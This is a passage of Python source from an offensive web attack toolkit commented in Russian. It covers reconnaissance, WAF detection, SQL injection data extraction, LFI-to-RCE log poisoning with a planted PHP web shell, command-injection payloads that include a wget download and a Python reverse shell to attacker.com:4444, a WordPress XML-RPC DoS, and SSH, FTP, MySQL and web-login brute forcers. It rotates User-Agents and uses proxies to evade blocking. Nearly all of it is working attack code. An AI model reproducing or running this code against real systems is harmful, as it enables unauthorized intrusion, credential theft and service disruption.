                # Поиск компонентов
                component_pattern = r'index\.php\?option=com_([^&"]+)'
                components = re.findall(component_pattern, content, re.IGNORECASE)
                analysis['components'] = list(set(components))[:15]
            
            # Drupal
            elif 'drupal' in content.lower():
                analysis['cms'] = 'Drupal'
                
                # Поиск модулей
                module_patterns = [
                    r'sites/all/modules/([^/]+)/',
                    r'/modules/([^/]+)/'
                ]
                
                modules = set()
                for pattern in module_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    modules.update(matches)
                
                analysis['modules'] = list(modules)[:15]
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis
    
    def find_auth_forms(self, url):
        """Поиск форм аутентификации"""
        forms = []
        
        try:
            self.rotate_user_agent()
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Поиск всех форм
            all_forms = soup.find_all('form')
            
            for form in all_forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # Поиск полей ввода
                inputs = form.find_all('input')
                input_names = [inp.get('name', '') for inp in inputs]
                input_types = [inp.get('type', '') for inp in inputs]
                
                # Проверяем, является ли это формой входа
                login_indicators = ['password', 'pass', 'pwd', 'login', 'user', 'username', 'email']
                password_fields = [name for name in input_names if any(indicator in name.lower() for indicator in login_indicators)]
                
                if any(inp_type == 'password' for inp_type in input_types) or password_fields:
                    forms.append({
                        'action': form_action,
                        'method': form_method,
                        'inputs': input_names,
                        'has_password': 'password' in input_types or bool(password_fields),
                        'html': str(form)[:500]
                    })
            
        except Exception as e:
            print(f"Ошибка поиска форм: {e}")
        
        return forms
    
    def find_api_endpoints(self, url):
        """Поиск API endpoints"""
        endpoints = []
        
        try:
            self.rotate_user_agent()
            response = self.session.get(url, timeout=5)
            content = response.text
            
            # Регулярные выражения для поиска API endpoints
            patterns = [
                r'["\'](/api/v[0-9]/[^"\']+)["\']',
                r'["\'](/api/[^"\']+)["\']',
                r'["\'](/v[0-9]/[^"\']+)["\']',
                r'["\'](/graphql[^"\']*)["\']',
                r'["\'](/rest/[^"\']+)["\']',
                r'["\'](/soap/[^"\']+)["\']',
                r'["\'](/ajax/[^"\']+)["\']',
                r'["\'](/json/[^"\']+)["\']',
                r'["\'](/xml/[^"\']+)["\']',
                r'["\'](/wsdl[^"\']*)["\']',
                r'["\'](/webhook[^"\']*)["\']',
                r'["\'](/callback[^"\']*)["\']',
                r'["\'](/oauth[^"\']*)["\']',
                r'["\'](/auth[^"\']*)["\']',
                r'["\'](/token[^"\']*)["\']'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if match not in endpoints:
                        endpoints.append(match)
            
        except Exception as e:
            print(f"Ошибка поиска API: {e}")
        
        return endpoints[:50]  # Ограничим вывод
    
    def extract_error_messages(self, url):
        """Извлечение сообщений об ошибках"""
        errors = []
        
        try:
            # Пытаемся вызвать ошибки
            test_urls = [
                f"{url}/'",
                f"{url}/\"",
                f"{url}/../../",
                f"{url}/?id='",
                f"{url}/?id=\"",
                f"{url}/nonexistentpage12345"
            ]
            
            for test_url in test_urls[:3]:
                try:
                    self.rotate_user_agent()
                    response = self.session.get(test_url, timeout=3)
                    
                    # Поиск сообщений об ошибках
                    error_patterns = [
                        r'error[^<]*</div>',
                        r'<div[^>]*class="[^"]*error[^"]*"[^>]*>([^<]+)',
                        r'<span[^>]*class="[^"]*error[^"]*"[^>]*>([^<]+)',
                        r'Exception:[^<]+',
                        r'Warning:[^<]+',
                        r'Fatal error:[^<]+',
                        r'SQL error[^<]*',
                        r'MySQL error[^<]*',
                        r'Syntax error[^<]*',
                        r'undefined[^<]*'
                    ]
                    
                    for pattern in error_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        for match in matches:
                            if match.strip() and match not in errors:
                                errors.append(match.strip()[:200])
                    
                except:
                    continue
            
        except Exception as e:
            print(f"Ошибка извлечения ошибок: {e}")
        
        return errors
    
    def check_backup_files(self, url):
        """Проверка файлов бэкапов"""
        backups = []
        backup_patterns = [
            'backup', 'bak', 'old', 'temp', 'tmp', 'copy',
            'archive', 'save', 'dump', 'sql', 'tar', 'zip',
            'gz', 'rar', '7z', 'tgz', 'bzip2'
        ]
        
        # Проверяем расширения в URL
        parsed = urlparse(url)
        path = parsed.path.lower()
        
        for pattern in backup_patterns:
            if pattern in path:
                backups.append({
                    'type': 'backup_file',
                    'url': url,
                    'pattern': pattern
                })
        
        return backups
    
    def check_config_files(self, url):
        """Проверка конфигурационных файлов"""
        configs = []
        config_patterns = [
            'config', 'setting', 'conf', 'ini', 'cfg',
            'yml', 'yaml', 'json', 'xml', 'properties',
            'env', '.env', 'environment'
        ]
        
        parsed = urlparse(url)
        path = parsed.path.lower()
        
        for pattern in config_patterns:
            if pattern in path:
                configs.append({
                    'type': 'config_file',
                    'url': url,
                    'pattern': pattern
                })
        
        return configs
    
    def check_debug_pages(self, url):
        """Проверка отладочных страниц"""
        debug_pages = []
        debug_patterns = [
            'debug', 'test', 'phpinfo', 'info.php',
            'status', 'monitor', 'health', 'ping',
            'console', 'adminer', 'phpmyadmin'
        ]
        
        parsed = urlparse(url)
        path = parsed.path.lower()
        
        for pattern in debug_patterns:
            if pattern in path:
                debug_pages.append({
                    'type': 'debug_page',
                    'url': url,
                    'pattern': pattern
                })
        
        return debug_pages
    
    def check_exposed_admin(self, url):
        """Проверка на доступные админ-панели"""
        admin_panels = []
        
        common_admin_paths = [
            '/admin/', '/administrator/', '/wp-admin/', '/login/',
            '/cpanel/', '/whm/', '/plesk/', '/webmin/',
            '/directadmin/', '/vhost/', '/controlpanel/',
            '/manager/', '/backend/', '/console/', '/admin.php'
        ]
        
        base_url = url.rstrip('/')
        
        for path in common_admin_paths[:5]:  # Проверяем только первые 5
            test_url = f"{base_url}{path}"
            try:
                self.rotate_user_agent()
                response = self.session.get(test_url, timeout=2)
                
                if response.status_code == 200:
                    admin_panels.append({
                        'url': test_url,
                        'status': response.status_code,
                        'title': re.search(r'<title>([^<]+)</title>', response.text, re.IGNORECASE)
                    })
            except:
                continue
        
        return admin_panels
    
    def analyze_cookies(self, url):
        """Анализ cookies"""
        cookies_info = {}
        
        try:
            self.rotate_user_agent()
            response = self.session.get(url, timeout=5)
            
            cookies = self.session.cookies
            if cookies:
                cookies_info['count'] = len(cookies)
                cookies_info['list'] = []
                
                for cookie in cookies:
                    cookies_info['list'].append({
                        'name': cookie.name,
                        'value': cookie.value[:50] + '...' if len(cookie.value) > 50 else cookie.value,
                        'domain': cookie.domain,
                        'path': cookie.path,
                        'secure': cookie.secure,
                        'httponly': hasattr(cookie, 'httponly') and cookie.httponly
                    })
            
        except Exception as e:
            cookies_info['error'] = str(e)
        
        return cookies_info
    
    def detect_waf(self, url):
        """Обнаружение WAF (Web Application Firewall)"""
        waf_info = {}
        
        try:
            self.rotate_user_agent()
            
            # Проверяем наличие WAF по различным признакам
            test_payloads = [
                ("' OR 1=1--", "SQL injection test"),
                ("<script>alert(1)</script>", "XSS test"),
                ("../../etc/passwd", "Path traversal test"),
                ("| ping -c 1 127.0.0.1", "Command injection test")
            ]
            
            waf_detected = False
            waf_indicators = []
            
            for payload, test_name in test_payloads[:2]:
                try:
                    test_url = f"{url}?test={quote(payload)}"
                    response = self.session.get(test_url, timeout=3)
                    
                    # Признаки WAF
                    waf_signatures = [
                        ('cloudflare', 'Cloudflare'),
                        ('akamai', 'Akamai'),
                        ('imperva', 'Imperva Incapsula'),
                        ('f5', 'F5 BIG-IP'),
                        ('barracuda', 'Barracuda'),
                        ('fortinet', 'FortiWeb'),
                        ('sucuri', 'Sucuri'),
                        ('wordfence', 'Wordfence'),
                        ('mod_security', 'ModSecurity'),
                        ('403 forbidden', 'Generic WAF'),
                        ('access denied', 'WAF/Proxy')
                    ]
                    
                    for signature, waf_name in waf_signatures:
                        if signature in response.text.lower() or signature in str(response.headers).lower():
                            waf_detected = True
                            if waf_name not in waf_indicators:
                                waf_indicators.append(waf_name)
                    
                except:
                    continue
            
            waf_info['detected'] = waf_detected
            waf_info['indicators'] = waf_indicators
            
        except Exception as e:
            waf_info['error'] = str(e)
        
        return waf_info
    
    def detect_cloud_provider(self, url):
        """Обнаружение облачного провайдера"""
        cloud_info = {}
        
        try:
            self.rotate_user_agent()
            response = self.session.get(url, timeout=5)
            headers = response.headers
            
            cloud_indicators = {
                'aws': ['x-amz-', 'aws', 'amazon'],
                'cloudflare': ['cf-ray', 'cloudflare', '__cf'],
                'google cloud': ['google', 'gce', 'gcp'],
                'azure': ['azure', 'microsoft'],
                'heroku': ['heroku', 'request-id'],
                'akamai': ['akamai', 'x-akamai'],
                'fastly': ['fastly', 'x-fastly']
            }
            
            detected = []
            for provider, indicators in cloud_indicators.items():
                for indicator in indicators:
                    if any(indicator in str(header).lower() for header in headers.items()):
                        if provider not in detected:
                            detected.append(provider)
                        break
            
            cloud_info['providers'] = detected
            
        except Exception as e:
            cloud_info['error'] = str(e)
        
        return cloud_info

# ==================== ADVANCED EXPLOITER CLASS ====================

class AdvancedExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.exploit_modules = self.load_all_exploits()
        self.proxy = None
        
    def load_all_exploits(self):
        """Загрузка всех эксплойтов"""
        return {
            'sqli': {
                'union_based': self.exploit_union_sqli,
                'error_based': self.exploit_error_sqli,
                'blind_time': self.exploit_blind_time_sqli,
                'blind_boolean': self.exploit_blind_boolean_sqli
            },
            'xss': {
                'stored': self.exploit_stored_xss,
                'reflected': self.exploit_reflected_xss,
                'dom': self.exploit_dom_xss
            },
            'lfi': {
                'file_read': self.exploit_lfi_read,
                'rce_log': self.exploit_lfi_rce_log,
                'rce_proc': self.exploit_lfi_rce_proc,
                'rce_php_wrapper': self.exploit_lfi_php_wrapper
            },
            'rce': {
                'command_injection': self.exploit_command_injection,
                'deserialization': self.exploit_deserialization,
                'template_injection': self.exploit_template_injection
            },
            'auth': {
                'login_bruteforce': self.exploit_login_bruteforce,
                'session_hijack': self.exploit_session_hijacking,
                'csrf_exploit': self.exploit_csrf,
                'oauth_exploit': self.exploit_oauth
            },
            'cms': {
                'wordpress': self.exploit_wordpress,
                'joomla': self.exploit_joomla,
                'drupal': self.exploit_drupal
            },
            'api': {
                'graphql_injection': self.exploit_graphql,
                'rest_enum': self.exploit_rest_enum,
                'soap_exploit': self.exploit_soap
            }
        }
    
    def set_proxy(self, proxy_url):
        """Установка прокси для обхода блокировок"""
        if proxy_url:
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            self.proxy = proxy_url
    
    def rotate_user_agent(self):
        """Ротация User-Agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        self.session.headers['User-Agent'] = random.choice(user_agents)
    
    def exploit_union_sqli(self, target, param):
        """Эксплуатация UNION-based SQL injection"""
        results = ["[UNION SQL Injection]"]
        
        # Определение количества колонок
        for i in range(1, 20):
            payload = f"' ORDER BY {i}--"
            test_url = f"{target}?{param}={payload}"
            
            try:
                self.rotate_user_agent()
                response = self.session.get(test_url, timeout=5)
                
                if 'unknown column' in response.text.lower() or 'order by' in response.text.lower():
                    column_count = i - 1
                    results.append(f"[+] Количество колонок: {column_count}")
                    
                    # Поиск уязвимых колонок
                    for j in range(1, column_count + 1):
                        null_list = ['null'] * column_count
                        null_list[j-1] = "'test'"
                        union_payload = f"' UNION SELECT {','.join(null_list)}--"
                        
                        union_url = f"{target}?{param}={union_payload}"
                        union_response = self.session.get(union_url, timeout=5)
                        
                        if 'test' in union_response.text:
                            results.append(f"[+] Колонка {j} уязвима для вывода данных")
                            
                            # Извлечение данных
                            extract_payloads = [
                                f"' UNION SELECT {','.join(['null']*(j-1) + ['version()'] + ['null']*(column_count-j))}--",
                                f"' UNION SELECT {','.join(['null']*(j-1) + ['user()'] + ['null']*(column_count-j))}--",
                                f"' UNION SELECT {','.join(['null']*(j-1) + ['database()'] + ['null']*(column_count-j))}--"
                            ]
                            
                            for ext_payload in extract_payloads:
                                ext_url = f"{target}?{param}={ext_payload}"
                                ext_response = self.session.get(ext_url, timeout=5)
                                
                                # Поиск данных в ответе
                                import re
                                data_match = re.search(r'[A-Za-z0-9_@\.\-]+', ext_response.text)
                                if data_match:
                                    results.append(f"[+] Данные: {data_match.group()}")
                    
                    break
                    
            except:
                continue
        
        if len(results) == 1:
            results.append("[-] UNION SQL injection не найдена")
        
        return results
    
    def exploit_blind_time_sqli(self, target, param):
        """Эксплуатация time-based blind SQL injection"""
        results = ["[Time-based Blind SQL Injection]"]
        
        # Тест на слепую инъекцию
        test_payloads = [
            f"' AND SLEEP(5)--",
            f"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            f"'; WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in test_payloads:
            test_url = f"{target}?{param}={payload}"
            
            try:
                start_time = time.time()
                self.rotate_user_agent()
                response = self.session.get(test_url, timeout=10)
                elapsed = time.time() - start_time
                
                if elapsed > 4.5:
                    results.append(f"[+] Time-based blind SQLi обнаружена (задержка {elapsed:.1f}с)")
                    results.append(f"[+] Payload: {payload}")
                    
                    # Извлечение данных по одному символу
                    results.append("[*] Попытка извлечь имя базы данных...")
                    
                    # Определение длины имени БД
                    db_name = ""
                    for i in range(1, 50):
                        length_payload = f"' AND (SELECT LENGTH(database())={i}) AND SLEEP(2)--"
                        length_url = f"{target}?{param}={length_payload}"
                        
                        start = time.time()
                        self.session.get(length_url, timeout=3)
                        elapsed_len = time.time() - start
                        
                        if elapsed_len > 1.5:
                            results.append(f"[+] Длина имени БД: {i} символов")
                            
                            # Извлечение посимвольно
                            for pos in range(1, i + 1):
                                for char in string.ascii_lowercase + string.digits + '_':
                                    char_payload = f"' AND SUBSTRING(database(),{pos},1)='{char}' AND SLEEP(2)--"
                                    char_url = f"{target}?{param}={char_payload}"
                                    
                                    start_char = time.time()
                                    self.session.get(char_url, timeout=3)
                                    elapsed_char = time.time() - start_char
                                    
                                    if elapsed_char > 1.5:
                                        db_name += char
                                        results.append(f"[+] Символ {pos}: {char}")
                                        break
                            
                            results.append(f"[+] Имя базы данных: {db_name}")
                            break
                    
                    break
                    
            except:
                continue
        
        if len(results) == 1:
            results.append("[-] Time-based blind SQLi не найдена")
        
        return results
    
    def exploit_lfi_rce_log(self, target, param):
        """LFI to RCE через логи"""
        results = ["[LFI to RCE через логи]"]
        
        # Попытка прочитать /etc/passwd
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "....//....//....//etc//passwd",
            "/etc/passwd"
        ]
        
        lfi_success = False
        for payload in lfi_payloads:
            test_url = f"{target}?{param}={quote(payload)}"
            
            try:
                self.rotate_user_agent()
                response = self.session.get(test_url, timeout=5)
                
                if 'root:' in response.text:
                    results.append(f"[+] LFI подтверждена: {payload}")
                    lfi_success = True
                    
                    # Попытка RCE через логи
                    log_paths = [
                        '/var/log/apache2/access.log',
                        '/var/log/apache/access.log',
                        '/var/log/httpd/access_log',
                        '/var/log/nginx/access.log',
                        '/usr/local/apache2/logs/access_log',
                        '/proc/self/environ'
                    ]
                    
                    for log_path in log_paths:
                        log_url = f"{target}?{param}={quote(log_path)}"
                        log_response = self.session.get(log_url, timeout=5)
                        
                        if 'GET /' in log_response.text or 'POST /' in log_response.text:
                            results.append(f"[+] Лог найден: {log_path}")
                            
                            # Внедрение PHP кода через User-Agent
                            php_code = '<?php system($_GET["cmd"]); ?>'
                            headers = {'User-Agent': php_code}
                            
                            # Сначала делаем запрос с вредоносным User-Agent
                            self.session.get(target, headers=headers, timeout=3)
                            
                            # Затем пытаемся выполнить команду
                            cmd_url = f"{target}?{param}={quote(log_path)}&cmd=id"
                            cmd_response = self.session.get(cmd_url, timeout=5)
                            
                            if 'uid=' in cmd_response.text:
                                results.append("[+] RCE УСПЕШНО!")
                                results.append("[+] Команда 'id' выполнена")
                                results.append(f"[+] Вывод: {cmd_response.text[:100]}")
                                
                                # Тест других команд
                                commands = ['whoami', 'pwd', 'ls -la', 'uname -a']
                                for cmd in commands[:2]:
                                    cmd_test_url = f"{target}?{param}={quote(log_path)}&cmd={quote(cmd)}"
                                    cmd_output = self.session.get(cmd_test_url, timeout=5)
                                    results.append(f"[>] {cmd}: {cmd_output.text[:50]}")
                                
                                return results
                    
                    break
                    
            except:
                continue
        
        if not lfi_success:
            results.append("[-] LFI не подтверждена")
        
        return results
    
    def exploit_command_injection(self, target, param):
        """Эксплуатация инъекции команд"""
        results = ["[Command Injection Exploit]"]
        
        cmd_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "& ps aux",
            "&& wget http://attacker.com/shell.php -O /tmp/shell.php",
            "| python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        ]
        
        for payload in cmd_payloads[:4]:
            test_url = f"{target}?{param}={quote(payload)}"
            
            try:
                self.rotate_user_agent()
                response = self.session.get(test_url, timeout=8)
                
                # Проверка результатов
                success_indicators = [
                    ('root:', 'Пользователь root обнаружен'),
                    ('uid=', 'ID пользователя'),
                    ('total ', 'Вывод ls'),
                    ('bin/', 'Содержимое каталога'),
                    ('www-data', 'Пользователь веб-сервера'),
                    ('apache', 'Пользователь Apache'),
                    ('nginx', 'Пользователь Nginx')
                ]
                
                for indicator, message in success_indicators:
                    if indicator in response.text:
                        results.append(f"[+] {message}: найдено '{indicator}'")
                        results.append(f"[+] Payload: {payload}")
                        results.append(f"[+] Ответ: {response.text[:200]}")
                        
                        # Попытка получения обратного соединения
                        if 'python3' in payload or 'wget' in payload:
                            results.append("[!] Запущена попытка обратного соединения")
                            results.append("[!] Проверьте listener на attacker.com:4444")
                        
                        return results
                        
            except Exception as e:
                results.append(f"[-] Ошибка: {str(e)}")
        
        results.append("[-] Command injection не подтверждена")
        return results
    
    def exploit_login_bruteforce(self, target, login_url=None, username_field='username', password_field='password'):
        """Брутфорс входа с использованием словарей"""
        results = ["[Login Bruteforce Attack]"]
        
        if not login_url:
            login_url = f"{target}/login.php"
        
        # Словари для брутфорса
        usernames = [
            'admin', 'administrator', 'root', 'test', 'user',
            'admin123', 'administrator123', 'superadmin',
            'manager', 'sysadmin', 'webadmin', 'superuser'
        ]
        
        passwords = [
            'admin', 'admin123', 'password', 'password123', '123456',
            'qwerty', 'letmein', 'welcome', 'monkey', 'abc123',
            'admin@123', 'Admin@123', 'P@ssw0rd', 'P@ssw0rd123',
            '12345678', '123456789', '1234567890', 'superman',
            'iloveyou', 'sunshine', 'princess', 'football'
        ]
        
        results.append(f"[*] Цель: {login_url}")
        results.append(f"[*] Используется {len(usernames)} логинов и {len(passwords)} паролей")
        
        found = False
        for username in usernames:
            for password in passwords:
                try:
                    self.rotate_user_agent()
                    
                    # Определяем метод формы
                    test_response = self.session.get(login_url, timeout=3)
                    
                    if 'method="post"' in test_response.text.lower():
                        # POST запрос
                        data = {
                            username_field: username,
                            password_field: password
                        }
                        
                        response = self.session.post(login_url, data=data, timeout=5)
                    else:
                        # GET запрос
                        params = {
                            username_field: username,
                            password_field: password
                        }
                        response = self.session.get(login_url, params=params, timeout=5)
                    
                    # Проверка успешного входа
                    success_indicators = [
                        'logout', 'log out', 'welcome', 'dashboard',
                        'profile', 'my account', 'successful',
                        'location: dashboard', '302 found'
                    ]
                    
                    if any(indicator in response.text.lower() or 
                           any(indicator in header.lower() for header in response.headers.items())
                           for indicator in success_indicators):
                        results.append(f"[+] УСПЕХ: {username}:{password}")
                        results.append(f"[+] URL после входа: {response.url}")
                        found = True
                        break
                    
                    # Задержка для избежания блокировки
                    time.sleep(0.2)
                    
                except Exception as e:
                    results.append(f"[-] Ошибка для {username}:{password} - {str(e)}")
                    time.sleep(1)  # Дольше при ошибках
            
            if found:
                break
        
        if not found:
            results.append("[-] Валидные учетные данные не найдены")
        
        return results
    
    def exploit_wordpress(self, target):
        """Эксплойты для WordPress"""
        results = ["[WordPress Exploits]"]
        
        # Проверка XML-RPC
        xmlrpc_url = f"{target}/xmlrpc.php"
        try:
            response = self.session.get(xmlrpc_url, timeout=3)
            if response.status_code == 200 and 'XML-RPC' in response.text:
                results.append("[+] XML-RPC включен (DoS/bruteforce возможен)")
                
                # Попытка DoS через pingback
                results.append("[*] Попытка XML-RPC DoS...")
                dos_payload = '''<?xml version="1.0" encoding="utf-8"?>
                <methodCall>
                    <methodName>system.multicall</methodName>
                    <params>
                        <param><value><array><data>'''
                
                for i in range(50):
                    dos_payload += f'''<value><struct>
                    <member><name>methodName</name>
                    <value><string>pingback.ping</string></value></member>
                    <member><name>params</name>
                    <value><array><data>
                    <value><string>{target}</string></value>
                    <value><string>http://attacker-{i}.com</string></value>
                    </data></array></value></member></struct>'''
                
                dos_payload += '''</data></array></value></param>
                    </params>
                </methodCall>'''
                
                dos_response = self.session.post(xmlrpc_url, data=dos_payload, 
                                                headers={'Content-Type': 'application/xml'}, 
                                                timeout=10)
                results.append(f"[+] DoS отправлен: {dos_response.status_code}")
                
        except:
            results.append("[-] XML-RPC не доступен")
        
        # Брутфорс wp-login.php
        wp_login_url = f"{target}/wp-login.php"
        results.extend(self.exploit_login_bruteforce(target, wp_login_url, 'log', 'pwd'))
        
        # Поиск уязвимых плагинов
        plugins = [
            ('revslider', 'revslider', 'showbiz'),
            ('all-in-one-seo-pack', 'aioseop'),
            ('contact-form-7', 'wpcf7'),
            ('yoast-seo', 'yoast'),
            ('elementor', 'elementor')
        ]
        
        for plugin, path in plugins[:3]:
            plugin_url = f"{target}/wp-content/plugins/{path}/"
            try:
                response = self.session.get(plugin_url, timeout=2)
                if response.status_code == 200:
                    results.append(f"[+] Плагин {plugin} обнаружен")
                    # Проверка известных уязвимостей для плагина
            except:
                pass
        
        return results
    
    def exploit_joomla(self, target):
        """Эксплойты для Joomla"""
        results = ["[Joomla Exploits]"]
        
        # Поиск компонентов
        components = [
            'com_content', 'com_users', 'com_media', 'com_config',
            'com_templates', 'com_modules', 'com_plugins'
        ]
        
        for component in components[:5]:
            comp_url = f"{target}/index.php?option={component}"
            try:
                response = self.session.get(comp_url, timeout=3)
                if response.status_code == 200:
                    results.append(f"[+] Компонент {component} доступен")
                    
                    # Проверка SQLi в компонентах
                    sqli_test_url = f"{comp_url}'"
                    sqli_response = self.session.get(sqli_test_url, timeout=3)
                    if 'sql' in sqli_response.text.lower():
                        results.append(f"[!] Возможна SQLi в {component}")
                        
            except:
                pass
        
        # Брутфорс административной панели
        admin_url = f"{target}/administrator/"
        results.extend(self.exploit_login_bruteforce(target, admin_url, 'username', 'passwd'))
        
        return results
    
    def exploit_graphql(self, target):
        """Эксплойты для GraphQL"""
        results = ["[GraphQL Exploits]"]
        
        graphql_endpoints = [
            f"{target}/graphql",
            f"{target}/graphql/",
            f"{target}/api/graphql",
            f"{target}/v1/graphql",
            f"{target}/v2/graphql"
        ]
        
        for endpoint in graphql_endpoints:
            try:
                # Проверка доступности GraphQL
                response = self.session.get(endpoint, timeout=3)
                
                if 'graphql' in response.text.lower() or response.status_code == 400:
                    results.append(f"[+] GraphQL endpoint найден: {endpoint}")
                    
                    # Попытка introspection query
                    introspection_query = {
                        "query": """
                        query IntrospectionQuery {
                            __schema {
                                types {
                                    name
                                    fields {
                                        name
                                        type {
                                            name
                                            kind
                                        }
                                    }
                                }
                            }
                        }
                        """
                    }
                    
                    introspection_response = self.session.post(
                        endpoint, 
                        json=introspection_query, 
                        timeout=5,
                        headers={'Content-Type': 'application/json'}
                    )
                    
                    if introspection_response.status_code == 200:
                        results.append("[+] Introspection включен - можно получить схему")
                        
                        # Поиск мутаций для изменения данных
                        if 'mutation' in introspection_response.text.lower():
                            results.append("[!] Мутации обнаружены - возможна модификация данных")
                    
                    # Проверка на GraphQL injection
                    malicious_query = {
                        "query": "query { __typename } #'"
                    }
                    
                    injection_response = self.session.post(
                        endpoint,
                        json=malicious_query,
                        timeout=5
                    )
                    
                    if 'error' in injection_response.text.lower():
                        results.append("[!] Возможна GraphQL injection")
                        
            except:
                continue
        
        if len(results) == 1:
            results.append("[-] GraphQL endpoints не найдены")
        
        return results
    
    def execute_exploit(self, exploit_type, exploit_name, **kwargs):
        """Выполнение конкретного эксплойта"""
        if exploit_type in self.exploit_modules and exploit_name in self.exploit_modules[exploit_type]:
            exploit_func = self.exploit_modules[exploit_type][exploit_name]
            
            # Установка прокси если есть
            if self.proxy:
                kwargs['session'] = self.session
            
            try:
                return exploit_func(**kwargs)
            except Exception as e:
                return [f"[-] Ошибка выполнения эксплойта: {str(e)}"]
        else:
            return [f"[-] Эксплойт {exploit_name} не найден"]

# ==================== ADVANCED BRUTEFORCE CLASS ====================

class AdvancedBruteforcer:
    def __init__(self):
        self.running = False
        self.results = []
        self.wordlists = self.load_wordlists()
    
    def load_wordlists(self):
        """Загрузка словарей"""
        return {
            'usernames': [
                'admin', 'administrator', 'root', 'test', 'user',
                'admin123', 'administrator123', 'superadmin',
                'manager', 'sysadmin', 'webadmin', 'superuser',
                'guest', 'demo', 'backup', 'service', 'support'
            ],
            'passwords': [
                'admin', 'admin123', 'password', 'password123', '123456',
                'qwerty', 'letmein', 'welcome', 'monkey', 'abc123',
                'admin@123', 'Admin@123', 'P@ssw0rd', 'P@ssw0rd123',
                '12345678', '123456789', '1234567890', 'superman',
                'iloveyou', 'sunshine', 'princess', 'football',
                'password1', 'Password1', 'pass123', 'Pass123',
                'welcome123', 'monkey123', 'qwerty123', 'letmein123'
            ],
            'ssh_keys': [
                'id_rsa', 'id_dsa', 'authorized_keys',
                'known_hosts', 'private_key', 'ssh_key'
            ]
        }
    
    def ssh_bruteforce(self, target, port=22, username_list=None, password_list=None, timeout=5):
        """Продвинутый SSH брутфорс"""
        if not username_list:
            username_list = self.wordlists['usernames']
        if not password_list:
            password_list = self.wordlists['passwords']
        
        results = []
        found = False
        
        results.append(f"[*] Начинаем SSH брутфорс {target}:{port}")
        results.append(f"[*] Логинов: {len(username_list)}, Паролей: {len(password_list)}")
        
        for username in username_list:
            if not self.running:
                break
                
            for password in password_list:
                if not self.running:
                    break
                    
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    ssh.connect(target, port=port, username=username, 
                               password=password, timeout=timeout,
                               banner_timeout=timeout)
                    
                    results.append(f"[+] УСПЕХ: {username}:{password}")
                    
                    # Выполнение команд
                    commands = ['id', 'whoami', 'uname -a', 'pwd']
                    for cmd in commands[:2]:
                        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=3)
                        output = stdout.read().decode().strip()
                        results.append(f"[>] {cmd}: {output}")
                    
                    # Проверка прав sudo
                    stdin, stdout, stderr = ssh.exec_command('sudo -l', timeout=3)
                    sudo_output = stdout.read().decode()
                    if 'may run' in sudo_output:
                        results.append("[!] Sudo права обнаружены:")
                        results.append(sudo_output[:200])
                    
                    ssh.close()
                    found = True
                    break
                    
                except paramiko.AuthenticationException:
                    results.append(f"[-] Неверно: {username}:{password}")
                except Exception as e:
                    results.append(f"[-] Ошибка: {username}:{password} - {str(e)}")
                
                # Случайная задержка для избежания блокировки
                time.sleep(random.uniform(0.1, 0.5))
            
            if found:
                break
        
        if not found:
            results.append("[-] Валидные учетные данные не найдены")
        
        return results
    
    def ftp_bruteforce(self, target, port=21):
        """FTP брутфорс"""
        results = []
        
        try:
            import ftplib
        except ImportError:
            return ["[-] Модуль ftplib не доступен"]
        
        results.append(f"[*] Начинаем FTP брутфорс {target}:{port}")
        
        for username in self.wordlists['usernames'][:10]:
            for password in self.wordlists['passwords'][:10]:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=5)
                    ftp.login(username, password)
                    
                    results.append(f"[+] УСПЕХ: {username}:{password}")
                    
                    # Получение листинга
                    files = []
                    ftp.retrlines('LIST', files.append)
                    results.append(f"[+] Содержимое: {len(files)} файлов")
                    
                    ftp.quit()
                    return results
                    
                except ftplib.error_perm:
                    pass
                except Exception as e:
                    results.append(f"[-] Ошибка: {str(e)}")
                    break
        
        results.append("[-] Валидные учетные данные не найдены")
        return results
    
    def mysql_bruteforce(self, target, port=3306):
        """MySQL брутфорс"""
        results = []
        
        try:
            import mysql.connector
        except ImportError:
            return ["[-] Установите mysql-connector-python"]
        
        results.append(f"[*] Начинаем MySQL брутфорс {target}:{port}")
        
        for username in ['root', 'admin', 'mysql'] + self.wordlists['usernames'][:5]:
            for password in self.wordlists['passwords'][:10]:
                try:
                    conn = mysql.connector.connect(
                        host=target,
                        port=port,
                        user=username,
                        password=password,
                        connection_timeout=3
                    )
                    
                    results.append(f"[+] УСПЕХ: {username}:{password}")
                    
                    # Получение информации
                    cursor = conn.cursor()
                    cursor.execute("SELECT version()")
                    version = cursor.fetchone()
                    results.append(f"[+] MySQL версия: {version}")
                    
                    cursor.execute("SHOW DATABASES")
                    databases = cursor.fetchall()
                    results.append(f"[+] Базы данных: {len(databases)}")
                    
                    conn.close()
                    return results
                    
                except mysql.connector.Error:
                    pass
                except Exception as e:
                    results.append(f"[-] Ошибка: {str(e)}")
                    break
        
        results.append("[-] Валидные учетные данные не найдены")
        return results
    
    def web_form_bruteforce(self, url, username_field, password_field, 
                           success_indicator=None, method='POST'):
        """Брутфорс веб-форм"""
        results = []
        
        session = requests.Session()
